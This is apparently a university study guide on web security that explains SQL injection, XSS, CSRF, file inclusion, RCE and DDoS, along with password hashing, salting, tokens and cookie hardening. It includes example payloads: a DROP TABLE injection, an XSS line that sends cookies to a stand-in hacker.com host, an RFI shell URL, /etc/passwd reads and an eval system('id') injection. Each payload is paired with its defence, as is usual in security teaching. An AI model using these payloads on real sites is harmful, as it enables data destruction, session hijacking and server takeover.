@@ -1,0 +1,531 @@
+================================================
+ELEC3609 Week 7 – Study Guide
+Web Security & Vulnerability Mitigation · 2025 Session
+================================================
+
+OVERVIEW
+--------
+This lecture explains how websites get hacked, the mindset that causes security failures, and the major classes of web attack: SQL injection, cross-site scripting, cross-site request forgery, file inclusion, remote code execution, and denial of service. It then covers how authentication, password storage, hashing, salting, tokens and cookies actually work, so you can defend them. Finally, it walks through real-world breaches that came from surprisingly basic mistakes. It is the security counterpart to the web-platform material earlier in the unit: once you can build a site, you must know how attackers break it.
+
+------------------------------------------------
+STATS:
+------------------------------------------------
+Lectures|1
+Core Vulnerabilities|SQLi, XSS, CSRF, LFI/RFI, RCE, DDoS
+Tracked CVEs|Over 160,000
+Security Body|OWASP (Top 10 list)
+Real Case Studies|macOS, Steam, MySpace, GitHub, vBulletin
+
+------------------------------------------------
+SECTION 1: Getting Hacked – Why Systems Fail
+------------------------------------------------
+Attackers rarely get lucky. Sites get hacked because system designers make predictable mistakes.
+
+**Why systems get hacked** — designers and developers:
+- **Protect the wrong things** — spend effort on low-risk assets while critical paths stay exposed.
+- **Protect the right things in the wrong way** — build flawed controls (e.g. stripping `<script>` tags instead of escaping HTML).
+- **Make poor assumptions** — assume input is well-formed, internal networks are trusted, or client-side checks cannot be bypassed.
+- **Fail to understand the threat model** — overlook attacker motivation, resources, and entry points.
+- **Fail to account for paradigm shifts** — build on legacy assumptions that break on the open Internet.
+- **Fail to understand system scope** — underestimate the full surface: third-party libraries, servers, and even human operators.
+
+Web security is genuinely hard. As Michal Zalewski writes in *The Tangled Web*, modern web applications are a **tangle of technologies** developed over time and haphazardly pieced together. Every part of the stack — from HTTP requests to browser scripts — has subtle security consequences, so developers must navigate the landscape confidently.
+
+**What does "getting hacked" mean?** There are two broad target types:
+
+| Target | How it is attacked | Examples |
+| --- | --- | --- |
+| **Servers** | Manipulating server-side code | SQL Injection, Remote Code Execution, Local/Remote File Inclusion |
+| **Users** | Altering or intercepting data on the user's computer while they use the site | Cross-Site Scripting (XSS), Cross-Site Request Forgery (CSRF) |
+
+**What can be hacked?** It is not just a product — it is everything around it:
+- A **product or component** — software program, cryptographic protocol, smart card.
+- **Infrastructure** — PC, operating system, communications, routers, DNS, cloud.
+- **Applications** — web server, payroll system.
+- Also: **IT staff**, **users and management**, **customers and external users**, **partners and vendors**.
+
+💡 **Why It Matters:** Security is not a feature you bolt on at the end — it is a property of the whole system. Recognising that servers *and* users are targets changes how you design every page.
+
+⚠️ **Common Trap:** The recurring lesson is blunt: **"It's a lot easier to break a system than to make it secure."** An attacker only needs one flaw; a defender must close them all.
+
+------------------------------------------------
+SECTION 2: Axioms & Risk Priorities
+------------------------------------------------
+These axioms are the mental model behind all web security thinking.
+
+**Axioms of Information Security:**
+- **Information security is a resource game** — an arms race between attacker resources and defence costs.
+- **All systems are buggy** — no non-trivial software is completely bug-free.
+- **The bigger the system, the buggier it is** — more code and surface area means more flaws.
+- **Nothing works in isolation** — a weakness in one component can compromise the whole.
+- **Humans are most often the weakest link** in a system.
+- **It's a lot easier to break a system than to make it secure** — defenders must fix every flaw, attackers only need one.
+
+🧠 **Memory Hook:** **"Resource, Bugs, Size, Isolation, Humans, Asymmetry"** — six truths that explain almost every breach.
+
+**Focus on the important risks.** Not every vulnerability deserves equal effort. You must balance three things:
+- **Likelihood** of the component being exploited.
+- **Damage** if it is exploited.
+- **Mitigation cost** to prevent exploitation.
+
+**Severity hierarchy and the management response it demands:**
+
+| Level | Management Action Required |
+| --- | --- |
+| 1. Severe | Managed by senior management with a detailed plan |
+| 2. High | Detailed research and management required at senior levels |
+| 3. Major | Senior management attention is needed |
+| 4. Significant | Management responsibility must be specified |
+| 5. Moderate | Managed by specific monitoring or response procedures |
+| 6. Low | Managed by routine procedures |
+| 7. Trivial | Unlikely to need specific application of resources |
+
+💡 **Why It Matters:** Limited time and money must go where risk × damage is highest. This is exactly the trade-off a professional security team makes.
+
+------------------------------------------------
+SECTION 3: Security Resources & Legal Rules
+------------------------------------------------
+**Industry frameworks and databases:**
+- **OWASP** (Open Web Application Security Project) — a global non-profit that provides comprehensive assessment and education on web vulnerabilities, including the authoritative **OWASP Top 10**.
+- **CVE** (Common Vulnerabilities and Exposures) — a public system tracking known breaches and data leaks; there are **over 160,000 tracked incidents**.
+- **DVWA** (Damn Vulnerable Web Application) — a very simple web app that demonstrates basic web vulnerabilities for training.
+- **PentesterLab** — practical tutorials and exercises for learning hacking and penetration-testing skills, including web exploitation.
+
+There is also **ELEC5616: Computer & Network Security** (offered in Semester 1) within the ECE school if you want to go deeper.
+
+**Ask for permission.** This is the single most important ethical and legal rule:
+- The **only** context where these techniques are legal is when the owners and administrators of the network or application have **explicitly permitted** you to test.
+- Sound knowledge of these tools opens commercial opportunities — it can be a rewarding career, so don't throw it away doing something stupid.
+
+**Cloud / AWS specifics:**
+- Cloud providers can prohibit certain security tools, especially those that **scan network port ranges** or send **malicious/malformed traffic**.
+- This is usually waived if you **submit a request to scan ahead of time**.
+
+⚠️ **Common Trap:** Running a port scanner against cloud infrastructure you do not own can violate the provider's terms even when you own the account. Pre-approve scans.
+
+------------------------------------------------
+SECTION 4: Web Vulnerabilities Overview
+------------------------------------------------
+The **OWASP Top 10** identifies the most widespread vulnerabilities on the internet. This lecture discusses several of them (there are many more):
+
+- **SQLi** — SQL Injection
+- **XSS** — Cross-Site Scripting
+- **CSRF** — Cross-Site Request Forgery
+- **Auth** — Authentication & Sessions
+- **Config** — Secure Configurations
+- **LFI/RFI** — Local/Remote File Inclusion
+- **RCE** — Remote Code Execution
+- **DDoS** — Distributed Denial of Service
+
+💡 **Why It Matters:** Knowing the standard catalogue means you can review any application against a known checklist rather than guessing where problems might be.
+
+------------------------------------------------
+SECTION 5: SQL Injection (SQLi)
+------------------------------------------------
+**SQL Injection** arises from failing to properly sanitise user input before inserting it into a database string.
+
+**Root cause:** untrusted user input is concatenated directly into a raw SQL query without parameterisation. This lets an attacker **break out of the data context** and change the query's syntax — and if the input can modify the query, it can be modified to run *any* database query. It is very common and can lead to complete compromise. Many automated tools both detect and exploit it.
+
+**Vulnerable PHP example:**
+```php
+// Get input
+$id = $_REQUEST['id'];
+// Check database
+$query = "SELECT first_name, last_name FROM users
+WHERE user_id = '$id';";
+$result = mysql_query($query);
+```
+
+**Normal request:**
+```
+http://example.com/?id=15
+```
+Executes: `SELECT first_name, last_name FROM users WHERE user_id = '15';` — behaves normally.
+
+**Malicious request:**
+```
+http://example.com/?id=%27%3B+DROP+TABLE+users%3B+--
+```
+Decodes to `'; DROP TABLE users; --`, producing:
+```
+SELECT first_name, last_name FROM users WHERE user_id = ''; DROP TABLE users; --';
+```
+How it works step by step:
+- `'` closes the single quote around `user_id`.
+- `;` terminates the first `SELECT` statement.
+- `DROP TABLE users;` runs an arbitrary database command.
+- `--` comments out the trailing quote so the query stays syntactically valid.
+
+**Automation:** **sqlmap** is a fully open-source Python program that automates most of the hard work of SQLi — detecting the flaw and dumping databases, extracting passwords, and even gaining OS shell access.
+
+**Defence:**
+- **Parameterised queries / prepared statements** — keep user data separate from SQL command logic; the driver treats input strictly as literal values, never executable code.
+- **Use an ORM** (Object-Relational Mapper) such as Sequelize, Django ORM, or SQLAlchemy, which uses parameterised queries under the hood.
+
+Flow from flaw to compromise:
+```
+Untrusted input → String concatenation → Malicious SQL → Database executes → Total data compromise
+```
+
+🧠 **Memory Hook:** SQLi = **"Data becomes code."** The fix is parameterisation so data can *never* become code.
+
+------------------------------------------------
+SECTION 6: Cross-Site Scripting (XSS)
+------------------------------------------------
+**Cross-Site Scripting** arises when an attacker can inject **HTML (and therefore JavaScript)** into a website. Remember that HTML tells the browser how to display a page, and it can embed JavaScript.
+
+**The vulnerable template:** A page inserts a user's name:
+```html
+<H1>Hello {% user.name %}</H1>
+```
+This is fine for normal names, but what if the user's name is:
+```html
+<script>alert("LOL");</script>
+```
+The page then renders:
+```html
+<H1>Hello <script>alert("LOL");</script></H1>
+```
+Now an alert fires when that user loads the page. An alert alone is harmless, but if the snippet runs on a **public page** (a user list, or a blog post showing an author's name) and is more malicious, "the effects can be devastating."
+
+💡 **Why It Matters:** If a hacker can execute JavaScript in your browser, they can **steal your cookies**. Injected script such as:
+```html
+document.write('<img src="http://hacker.com/collect.php?cookie=' + document.cookie + '" />')
+```
+sends every victim's cookie to the attacker's server. With that cookie the hacker can **authenticate as that user** and hijack the session.
+
+**Preventing XSS — the wrong way:** *Stripping all `<script>` tags* is WRONG. It is easily bypassed:
+- **Nested evasion:** `<s<script>cript>...</script>` — removing the inner `<script>` collapses into `<script>...</script>`.
+- **Event handlers / other tags:** `<img src="img.jpg" onerror="alert(1)" />` executes JavaScript with no `<script>` tag at all.
+- There are many ways to perform XSS, and it is **impossible to recognise them all**.
+
+**Preventing XSS — the right way:** **HTML escaping** via your templating library:
+1. User input is stored in the database **as-is**, even if it contains HTML tags.
+2. Upon displaying any data, it is **HTML-escaped by default**.
+
+Escaping replaces dangerous characters:
+- `<` becomes `&lt;`
+- `>` becomes `&gt;`
+- `"` becomes `&quot;`
+- `'` becomes `&#x27;`
+- `&` becomes `&amp;`
+
+So the malicious name renders as:
+```html
+<H1>Hello &lt;script&gt;alert(&quot;LOL&quot;);&lt;/script&gt;</H1>
+```
+The browser now displays the literal text `<script>alert("LOL");</script>` on screen instead of executing it.
+
+⚠️ **Common Trap:** Escaping only works if you escape on **output** in the correct context. Storing raw data is fine; rendering it unescaped is the bug.
+
+------------------------------------------------
+SECTION 7: Cross-Site Request Forgery (CSRF)
+------------------------------------------------
+**Cross-Site Request Forgery (CSRF)** is an exploit against a website that arises when **only the browser is authenticated** (e.g. via a cookie) but the **user's request is not properly authenticated**.
+
+**Attack flow:**
+1. User logs into `bank.com` — a session cookie is stored in the browser.
+2. User visits a malicious site, `attacker.com`.
+3. `attacker.com` contains a hidden form submitting to `bank.com/transfer?to=hacker&amount=1000`.
+4. The user's browser executes the request, **automatically attaching** `bank.com` session cookies.
+5. `bank.com` processes the transfer, believing it came legitimately from the user.
+
+**Preventing CSRF:** include a **CSRF token** on requests that change data (e.g. POST, but not GET).
+- The site uses JavaScript to submit a special token, taken from a cookie, as one of the POST variables — a token only it has access to.
+- The token typically appears somewhere in the HTML or in the cookies.
+- The server checks that the submitted token matches the token bound to the user's session; because `attacker.com` cannot read the victim's token (the **Same-Origin Policy** blocks it), forged requests are rejected.
+
+⚠️ **Common Trap:** **Checking for the mere presence of a CSRF token in a cookie is not enough** — the browser sends cookies automatically, so a forged request would carry it. The token **must be included as a variable** (in the request body/header) to authenticate the request.
+
+------------------------------------------------
+SECTION 8: Authentication & Password Storage
+------------------------------------------------
+**Authentication has two stages:**
+1. **Logging in** — proving identity, e.g. username and password.
+2. **Identifying the logged-in session** — maintaining state across later requests, e.g. via cookies.
+
+**The login flow:**
+1. The user sees a login form and provides a username and password.
+2. The server **hashes** the password and compares the computed hash with its stored password hash for that user.
+3. If the hashes match, the user is authenticated and the server responds with an **authentication cookie/token**.
+
+**Password storage:** If passwords were stored in the database as **plaintext**, an attacker who gains access to the database could authenticate as anyone. Therefore we store **password hashes** — so a breach does not hand over usable passwords. To use stolen hashes, an attacker would need to **reverse the hash** to recover the original passwords.
+
+💡 **Why It Matters:** A database leak should be a bad day, not a total account takeover. Hashing is what turns stolen credential rows into useless noise.
+
+------------------------------------------------
+SECTION 9: Hashing, Cracking & Salting
+------------------------------------------------
+**Hash functions** map an input string to an output hash. Desirable properties:
+- **One way (pre-image resistance)** — given a hash, the original string cannot be computed.
+- **Unpredictable (avalanche effect)** — you cannot choose an input to get a particular output hash; tiny input changes give completely different outputs.
+- **Non-collision (collision resistance)** — you cannot find two different inputs that map to the same output hash.
+
+**Cracking passwords:** An attacker with stolen hashes can compute the hash of every possible password and match it to the hash list. This works because passwords are hard to invent and remember — most human passwords are in a dictionary, either as a word or a concatenation of words.
+
+**Rainbow tables** are a major extension of this attack: precomputed lookup tables of commonly used passwords (e.g. `password1`, `ilikecats123`) and common word variations, used to supplement dictionary attacks. These attacks won't work on every user (a unique gibberish password survives), but they have been shown to work on **large portions of leaked password hash sets**.
+
+**Salting** mitigates dictionary attacks without forcing stricter password rules on users:
+- Before hashing, the raw password is **concatenated with another string called the salt**.
+- **Stored Hash** `Hash(Password + Salt)`
+- Salts are usually stored in **plaintext** in the database, right next to the password hashes.
+- **A different salt is used for each user**, for further security.
+- This **thwarts dictionary attacks that rely on massive precomputation** (rainbow tables), because the unique salt changes the hash for every user — attackers must recompute dictionary hashes individually per account, vastly increasing cost.
+- ⚠️ Once the salt is known, however, brute-force dictionary attacks may still be run. Salting raises the cost; it does not make a weak password strong.
+
+🧠 **Memory Hook:** Password defence ladder: **Plaintext (worst) → Hash (better) → Hash + per-user Salt (best of these).**
+
+------------------------------------------------
+SECTION 10: Auth Tokens & Cookie Security
+------------------------------------------------
+After authentication, the server provides an **auth token**, delivered in the cookies. There are **two main ways** to manage that token:
+
+| Approach | How it works | Trade-off |
+| --- | --- | --- |
+| **Stateful** | Store valid tokens and expiry in a database (e.g. Redis) | Obvious and simple, but uses memory/storage and a lookup per request |
+| **Stateless (calculated)** | Compute valid tokens from a hash of details and a secret | No token storage, but CPU cost to recompute each request |
+
+**Calculated authentication tokens** let the server check authentication **without storing tokens**. It computes a value that can be recomputed after every request, then checks whether the provided token matches the calculated one. This adds **computational overhead** (recomputed every request) but **reduces memory overhead**.
+
+A sample Python implementation:
+```python
+def build_auth_token(self):
+    max_validity_duration_seconds = 21600  # 6 hours
+    timestamp = int(datetime.datetime.utcnow().strftime("%s"))
+    # Quantise the timestamp into the current 6-hour window
+    validity_timestamp = int(timestamp - (timestamp % max_validity_duration_seconds))
+    auth_token = hashlib.sha512(
+        self.secret_key[0] +
+        str(validity_timestamp) +
+        str(self.id) +
+        self.secret_key[1]
+    )
+    return auth_token.hexdigest()
+
+def validate_auth_token(self, token):
+    return self.build_auth_token() == token
+```
+The server combines a **secret key**, a **time window**, and the **user ID**, and recomputes the same hash to validate.
+
+**Storing and sending cookies — a hardening checklist:**
+
+| Security measure | Protection |
+| --- | --- |
+| **Always use HTTPS** | Prevents network **MITM** attacks from sniffing auth cookies |
+| **Secure attribute** | Cookie is only sent when connecting via HTTPS |
+| **HttpOnly attribute** | Scripts on the page cannot read the cookie (e.g. via XSS); cookies are only sent with HTTP(S) requests |
+
+💡 **Why It Matters:** An auth cookie is a temporary password. HTTPS stops it being sniffed, `Secure` stops it leaking over plaintext, and `HttpOnly` removes the easiest XSS cookie-theft path.
+
+------------------------------------------------
+SECTION 11: Local & Remote File Inclusion
+------------------------------------------------
+**Local/Remote File Inclusion** (`file:///`) is a vulnerability where the web application is manipulated into loading an **unexpected file**. This can be used to read a file's contents or to change the program's behaviour dynamically.
+
+**Vulnerable code:**
+```php
+$page = $_GET["page"];
+include($page);
+```
+
+**Exploitation types:**
+- **Local File Inclusion (LFI)** — files already on the server. Visiting:
+  ```
+  http://example.com/index.php?page=/etc/passwd
+  ```
+  outputs the `/etc/passwd` file if not configured correctly, leaking sensitive system account data. Using path traversal:
+  ```
+  http://example.com/index.php?page=../../../../etc/passwd
+  ```
+- **Remote File Inclusion (RFI)** — trick the server into loading a file from a remote location, e.g. `...?page=http://hacker.com/malicious_shell.txt`, causing the server to fetch and execute remote code.
+
+While this looks obvious, it is a **very common bug**.
+
+**Defence:** Never let user parameters govern which files can be included. Use a **strict hardcoded lookup map or whitelist** of allowed page templates.
+
+------------------------------------------------
+SECTION 12: Remote Code Execution (RCE)
+------------------------------------------------
+**Remote / Arbitrary Code Execution** is a vulnerability where an attacker can provide code that runs on the remote server. It is considered **the worst type of exploit** because it quickly leads to **full server compromise**.
+
+**Common culprits:**
+- The **`eval()` function** (or equivalent dynamic evaluation such as `exec()`, `passthru()`, `system()`).
+- **PHP `unserialize()`** (insecure object unserialisation; Python's `pickle.loads()` is analogous).
+- **Regular expressions with the `e` flag** (deprecated PHP `/e` modifier that evaluates the replacement as code).
+
+**Example vulnerability** (from the OWASP Code Injection page):
+```php
+$myvar = "varname";
+$x = $_GET['arg'];
+eval("\$myvar = \$x;");
+```
+If `$x` contains `1; system('id');`, the server executes `system('id')` with web-server privileges.
+
+**Defence:** Avoid `eval()` and related unsafe dynamic execution constructs entirely. If system calls are mandatory, sanitise and validate inputs against rigorous whitelists.
+
+✅ **Exam Tip:** RCE is the "game over" vulnerability — link it to least privilege and file inclusion, because a compromised low-privilege user limits the blast radius.
+
+------------------------------------------------
+SECTION 13: Denial of Service (DDoS)
+------------------------------------------------
+**Denial of Service** attacks prevent anyone from accessing a particular website. Typically this is done by **flooding the site with a very large amount of traffic** from distributed botnets so legitimate user requests cannot be processed, exhausting bandwidth, CPU, or database connections.
+
+**Defence is very difficult:**
+- Detection mechanisms to separate attack traffic from legitimate "flash crowds" introduce a **large amount of overhead** for legitimate requests.
+- The only real way to defend your system is to **"absorb"** the attack traffic, using distributed CDNs, Anycast routing, rate limiting, and web application firewalls (WAFs).
+
+💡 **Why It Matters:** You cannot easily filter a DDoS without also hurting real users, so resilience — spreading load and having surplus capacity — matters as much as detection.
+
+------------------------------------------------
+SECTION 14: Real-World Case Studies
+------------------------------------------------
+Real breaches often stem from surprisingly **basic** flaws.
+
+**Empty password flaws** — services that logged users in when an empty password was submitted:
+- **Apple / macOS High Sierra (2017)** — a bug let you log in as admin with no password required.
+- **Valve / Steam (2015)** — the password-reset flow allowed changing passwords with blank tokens.
+- **Linux-PAM < 1.5.1** — CVE-2020-27780 authentication bypass with empty passwords.
+
+**Default accounts with empty passwords** — anyone could log in:
+- **Western Digital My Cloud (2019)** — CVE-2019-9950, unauthenticated admin access via default credentials.
+- **Microsoft SQL Server (2000)** — CVE-2000-1209, default `sa` account with a blank password.
+- **D-Link (2020)** — CVE-2020-8864, default backdoor accounts with empty passwords.
+
+**No password check at all** — logins accepted without checking the password:
+- **IRC5 (2020)** — CVE-2020-10288.
+- **Eclipse Mosquitto (2018)** — CVE-2018-12551.
+- **Keycloak (2019)** — CVE-2019-14909.
+
+**High-profile web incidents:**
+- **Dropbox** — a security bug made passwords optional for four hours.
+- **vBulletin CVE-2015-7808** — an RCE flaw exploited in public forums worldwide (in Metasploit).
+- **The MySpace Samy Worm** — the fastest-spreading XSS worm, using unescaped HTML/JS in profiles.
+- **GitHub DDoS** — one of the largest recorded DDoS attacks.
+- **The Annoying Site** — a demonstrated browser annoyance/exploit example.
+
+🧠 **Memory Hook:** Most famous breaches were not exotic — they were **empty/blank/default password** mistakes. Always enforce the basics.
+
+================================================
+KEY TAKEAWAYS
+================================================
+1. **Attackers exploit designer mistakes** — wrong priorities, wrong implementation, poor assumptions, weak threat models, and misunderstood scope.
+2. **Servers vs users** — SQLi, RCE, and file inclusion hit servers; XSS and CSRF hit users; both can lead to compromise.
+3. **Prioritise risk** — balance likelihood of exploitation, damage if exploited, and mitigation cost across a 7-level severity hierarchy.
+4. **Use standard resources and stay legal** — OWASP, CVE, DVWA, PentesterLab; only test systems you are explicitly permitted to test, and pre-approve cloud scans.
+5. **SQLi = data becomes code** — defend with parameterised/prepared statements or an ORM, never string concatenation.
+6. **XSS = injected HTML/JS** — stripping `<script>` fails; escape output with your templating library.
+7. **CSRF = the browser is authenticated, not the user's intent** — use per-request CSRF tokens passed as a variable, not just a cookie.
+8. **Hash passwords, never store plaintext** — hashes must be one-way, unpredictable, and collision-resistant.
+9. **Salt every password uniquely** — salting defeats precomputed rainbow tables and forces per-user recomputation.
+10. **Manage auth tokens statefully (DB) or statelessly (calculated)** — calculated tokens trade CPU for less memory.
+11. **Harden cookies** — always HTTPS, plus the `Secure` and `HttpOnly` attributes.
+12. **LFI/RFI loads unexpected files; RCE runs attacker code** — whitelist included files and never use `eval()`.
+13. **DDoS defence means absorbing traffic** — detection adds overhead, so CDNs, rate limiting, and WAFs matter.
+14. **Basics matter most** — empty, default, and unchecked passwords caused many real breaches.
+
+================================================
+TERMS TO KNOW
+================================================
+**OWASP**: Open Web Application Security Project — non-profit publishing the OWASP Top 10 web vulnerability list
+**CVE**: Common Vulnerabilities and Exposures — public database of known vulnerabilities and breaches (>160,000 tracked)
+**DVWA**: Damn Vulnerable Web Application — intentionally vulnerable app for practising web attacks
+**PentesterLab**: Hands-on penetration-testing tutorials and web exploitation labs
+**Threat model**: The understanding of who attacks a system, why, and through which entry points
+**Attack surface**: The full set of components, code, people, and interfaces an attacker can target
+**Axiom**: A foundational security truth, e.g. all systems are buggy
+**SQLi**: SQL Injection — altering an SQL query by injecting unsanitised input
+**Parameterised query**: Prepared statement that keeps user data separate from SQL command logic
+**ORM**: Object-Relational Mapper — library that builds parameterised queries automatically
+**sqlmap**: Open-source Python tool that automates detecting and exploiting SQL injection
+**XSS**: Cross-Site Scripting — injecting HTML/JavaScript that runs in a victim's browser
+**HTML escaping**: Converting characters like `<` and `>` into entities such as `&lt;` and `&gt;` so they display, not execute
+**CSRF**: Cross-Site Request Forgery — forcing a logged-in browser to send an unintended request
+**CSRF token**: A secret per-request value that proves a state-changing request came from the real site
+**Same-Origin Policy**: Browser rule preventing one site from reading another site's data/tokens
+**Authentication**: Proving identity, typically with a username and password
+**Session**: State maintained across requests after login, usually via a cookie or token
+**Hash function**: A one-way function mapping an input string to a fixed output hash
+**One-way (pre-image resistance)**: Property that a hash cannot be reversed to recover the input
+**Unpredictable (avalanche effect)**: Property that you cannot target a specific output hash, and small input changes change the output fully
+**Non-collision (collision resistance)**: Property that two different inputs cannot produce the same hash
+**Dictionary attack**: Hashing common words/passwords and matching them against stolen hashes
+**Rainbow table**: Precomputed lookup table of popular passwords and variations mapped to hashes
+**Salt**: A random string concatenated with a password before hashing, stored in plaintext per user
+**Auth token**: Credential issued after login and carried in cookies to identify the session
+**Stateful token**: Valid token and expiry stored in a database (e.g. Redis)
+**Stateless (calculated) token**: Token recomputed from a secret, a time window, and user ID without storage
+**MITM**: Man-In-The-Middle — an attacker intercepting network traffic
+**Secure attribute**: Cookie flag ensuring the cookie is only sent over HTTPS
+**HttpOnly attribute**: Cookie flag blocking JavaScript from reading the cookie
+**LFI**: Local File Inclusion — loading an unexpected local file (e.g. `/etc/passwd`)
+**RFI**: Remote File Inclusion — loading and executing a file from a remote attacker-controlled server
+**Path traversal**: Using `../` sequences to reach files outside the intended directory
+**RCE**: Remote Code Execution — running attacker-supplied code on the server; worst-case exploit
+**eval()**: Dangerous function that executes a string as code
+**Unserialisation**: Reconstructing objects from data; insecure versions (PHP `unserialize()`, Python `pickle`) enable RCE
+**DDoS**: Distributed Denial of Service — flooding a site from many sources so legitimate users are locked out
+**WAF**: Web Application Firewall — filters malicious traffic before it reaches the application
+**Flash crowd**: A surge of legitimate traffic that can be mistaken for an attack
+**Plaintext password**: A password stored unencrypted — a critical design failure
+
+================================================
+MNEMONICS & QUICK RECALL
+================================================
+**Why Systems Get Hacked**: **Wrong, Wrong Way, Assumptions, Threat Model, Paradigms, Scope**
+**Six Security Axioms**: **R-B-S-I-H-A** — Resource game, Buggy systems, Size, Isolation, Humans, Asymmetry
+**Vulnerability → Defence**: **SQLi→Parameterise, XSS→Escape, CSRF→Token, LFI/RFI→Whitelist, RCE→Avoid eval**
+**Hash Properties**: **O-U-N** — One-way, Unpredictable, Non-collision
+**Cookie Hardening**: **H-S-H** — HTTPS, Secure flag, HttpOnly flag
+**Authentication Stages**: **Login, then Session** — prove identity, then remember it
+**Salting**: **Hash(Password + Salt)** — unique random salt per user defeats rainbow tables
+**RCE Culprits**: **eval, unserialize, regex /e** — the three classic code-execution vectors
+
+================================================
+WORKED EXAMPLES
+================================================
+### Example 1: Tracing a SQL injection
+The query is `SELECT first_name, last_name FROM users WHERE user_id = '$id';`. The attacker supplies `%27%3B+DROP+TABLE+users%3B+--`, which decodes to `'; DROP TABLE users; --`. The `'` closes the string, `;` ends the statement, `DROP TABLE users;` runs, and `--` comments the rest. Result: the `users` table is destroyed. Defence: parameterise the query so the whole payload is treated as a single literal value.
+
+### Example 2: Cookie theft via XSS, then CSRF contrast
+A user's name is set to `<script>document.write('<img src="http://hacker.com/collect.php?cookie=' + document.cookie + '" />')</script>`. When any page lists that name, the victim's cookie is sent to the attacker, who can then authenticate as them. Notice this steals the session directly. CSRF is different: it never sees the cookie — it just makes the browser send the cookie automatically to a state-changing endpoint, which a CSRF token blocks.
+
+### Example 3: Why stripping `<script>` fails
+If you strip `<script>` from input, the attacker submits `<s<script>cript>alert(1);</script>`. Removing the inner tag leaves `<script>alert(1);</script>`, which executes. Or the attacker uses `<img src="x" onerror="alert(1)" />` with no script tag at all. The correct fix is output-side HTML escaping.
+
+### Example 4: Salting stops a rainbow table
+Suppose two users both choose `password1`. Without salt, both hashes are identical and a rainbow table maps that hash straight back to `password1`. With a unique salt each, the stored values become `Hash("password1"+"a7f3")` and `Hash("password1"+"9c02")` — completely different, and absent from any precomputed table, so the attacker must brute-force each account separately.
+
+### Example 5: Heightened RCE through eval
+Given `eval("\$myvar = \$x;")` with `$x = "1; system('id');"`, the server evaluates the string as code and runs `system('id')`, returning the server's identity to the attacker. Fix: never evaluate user input as code.
+
+================================================
+EXAM FOCUS
+================================================
+1. Why do websites get hacked? → Answer: Designers protect the wrong things, protect the right things the wrong way, make poor assumptions, fail to understand the threat model, fail to account for paradigm shifts, and fail to understand their system's scope.
+
+2. Distinguish server-side from client-side attacks with examples. → Answer: Server-side attacks manipulate backend code/queries (SQLi, RCE, LFI/RFI); client-side attacks alter or intercept data in the victim's browser (XSS, CSRF).
+
+3. Explain the root cause of SQL injection and its gold-standard defence. → Answer: Untrusted input is concatenated into an SQL string, letting the attacker change query syntax. The defence is parameterised/prepared queries (or an ORM), which separate data from code.
+
+4. Why is stripping `<script>` tags an inadequate XSS defence? → Answer: It is bypassed by nested tags (`<s<script>cript>`) and by event-handler attributes like `<img onerror="...">`. Output-side HTML escaping is required.
+
+5. How does XSS become session hijacking? → Answer: Injected JavaScript reads `document.cookie` and sends it to an attacker's server; the attacker then authenticates as the victim.
+
+6. What is CSRF and why is a CSRF token in a cookie alone insufficient? → Answer: CSRF forces a logged-in browser to send an unintended request; because browsers attach cookies automatically, mere presence proves nothing. The token must be submitted as a request variable/header bound to the session.
+
+7. List the three desirable properties of a cryptographic hash function. → Answer: One-way (pre-image resistance), unpredictable (avalanche effect), and collision-resistant (non-collision).
+
+8. How does salting defeat rainbow tables? → Answer: A unique random salt is concatenated with each password before hashing, so precomputed tables no longer match; attackers must recompute dictionary hashes per user.
+
+9. Compare stateful and stateless authentication tokens. → Answer: Stateful stores valid tokens/expiry in a database (e.g. Redis); stateless recalculates the token from a secret, time window, and user ID, trading CPU cost for reduced storage.
+
+10. Which cookie attributes protect a session, and against what? → Answer: HTTPS prevents network MITM sniffing; `Secure` ensures the cookie is only sent over HTTPS; `HttpOnly` stops scripts (e.g. XSS) from reading it.
+
+11. Differentiate LFI and RFI. → Answer: LFI loads local files already on the server (e.g. `/etc/passwd` via path traversal); RFI loads and executes a file from a remote attacker-controlled location.
+
+12. Why is remote code execution considered the worst exploit? → Answer: It lets the attacker run arbitrary code on the server, quickly leading to full system compromise.
+
+13. How should a DDoS be defended against? → Answer: There is no easy filter — detection adds overhead for legitimate users, so the practical approach is to absorb traffic using CDNs, Anycast, rate limiting, and WAFs.
+
+14. What common thread links many real-world breaches? → Answer: Basic authentication failures — empty passwords, default accounts with empty passwords, and accepting logins without checking passwords.
+
